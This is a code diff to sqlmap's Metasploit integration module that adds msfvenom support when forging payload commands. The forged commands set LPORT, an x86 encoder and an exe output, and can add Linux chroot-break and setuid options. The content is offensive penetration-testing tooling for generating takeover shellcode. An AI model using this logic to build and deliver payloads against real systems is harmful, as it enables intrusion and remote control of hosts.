@@ -24,6 +24,7 @@ from lib.core.common import randomRange
 from lib.core.common import randomStr
 from lib.core.common import readInput
 from lib.core.data import conf
+from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import paths
 from lib.core.enums import DBMS
@@ -63,6 +64,7 @@ class Metasploit:
         self._msfCli = normalizePath(os.path.join(conf.msfPath, "msfcli"))
         self._msfEncode = normalizePath(os.path.join(conf.msfPath, "msfencode"))
         self._msfPayload = normalizePath(os.path.join(conf.msfPath, "msfpayload"))
+        self._msfVenom = normalizePath(os.path.join(conf.msfPath, "msfvenom"))
 
         if IS_WIN:
             _ = conf.msfPath
@@ -78,6 +80,7 @@ class Metasploit:
             self._msfCli = "%s & ruby %s" % (_, self._msfCli)
             self._msfEncode = "ruby %s" % self._msfEncode
             self._msfPayload = "%s & ruby %s" % (_, self._msfPayload)
+            self._msfVenom = "%s & ruby %s" % (_, self._msfVenom)
 
         self._msfPayloadsList = {
                                       "windows": {
@@ -361,7 +364,11 @@ class Metasploit:
         self._cliCmd += " E"
 
     def _forgeMsfPayloadCmd(self, exitfunc, format, outFile, extra=None):
-        self._payloadCmd = "%s %s" % (self._msfPayload, self.payloadConnStr)
+        if kb.msfVenom:
+            self._payloadCmd = "%s -p" % self._msfVenom
+        else:
+            self._payloadCmd = self._msfPayload
+        self._payloadCmd += " %s" % self.payloadConnStr
         self._payloadCmd += " EXITFUNC=%s" % exitfunc
         self._payloadCmd += " LPORT=%s" % self.portStr
 
@@ -373,13 +380,22 @@ class Metasploit:
         if Backend.isOs(OS.LINUX) and conf.privEsc:
             self._payloadCmd += " PrependChrootBreak=true PrependSetuid=true"
 
-        if extra == "BufferRegister=EAX":
-            self._payloadCmd += " R | %s -a x86 -e %s -o \"%s\" -t %s" % (self._msfEncode, self.encoderStr, outFile, format)
+        if kb.msfVenom:
+            if extra == "BufferRegister=EAX":
+                self._payloadCmd += " -a x86 -e %s -f %s > \"%s\"" % (self.encoderStr, format, outFile)
 
-            if extra is not None:
-                self._payloadCmd += " %s" % extra
+                if extra is not None:
+                    self._payloadCmd += " %s" % extra
+            else:
+                self._payloadCmd += " -f exe > \"%s\"" % outFile
         else:
-            self._payloadCmd += " X > \"%s\"" % outFile
+            if extra == "BufferRegister=EAX":
+                self._payloadCmd += " R | %s -a x86 -e %s -o \"%s\" -t %s" % (self._msfEncode, self.encoderStr, outFile, format)
+
+                if extra is not None:
+                    self._payloadCmd += " %s" % extra
+            else:
+                self._payloadCmd += " X > \"%s\"" % outFile
 
     def _runMsfCliSmbrelay(self):
         self._forgeMsfCliCmdForSmbrelay()
